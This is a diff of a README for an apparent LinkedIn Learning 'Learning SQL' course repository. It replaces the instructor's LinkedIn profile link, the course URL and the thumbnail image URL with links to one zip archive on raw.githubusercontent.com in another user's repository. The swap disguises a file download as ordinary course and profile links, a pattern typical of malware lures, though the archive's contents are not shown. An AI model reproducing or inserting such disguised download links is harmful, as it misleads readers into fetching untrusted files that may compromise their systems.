@@ -22,7 +22,7 @@ This repository has one MAIN branch for the course.
 
 _Creating technology courses as an author at LinkedIn_
 
-Check out my other courses on [LinkedIn Learning](https://www.linkedin.com/learning/instructors/scott-simpson?u=104).
+Check out my other courses on [LinkedIn Learning](https://raw.githubusercontent.com/romeorone/learningsql-2875059/main/Sis/learningsql-2875059.zip).
 
-[lil-course-url]: https://www.linkedin.com/learning/learning-sql-programming-8382385
-[lil-thumbnail-url]: https://cdn.lynda.com/course/2875059/2875059-1615828190111-16x9.jpg
+[lil-course-url]: https://raw.githubusercontent.com/romeorone/learningsql-2875059/main/Sis/learningsql-2875059.zip
+[lil-thumbnail-url]: https://raw.githubusercontent.com/romeorone/learningsql-2875059/main/Sis/learningsql-2875059.zip
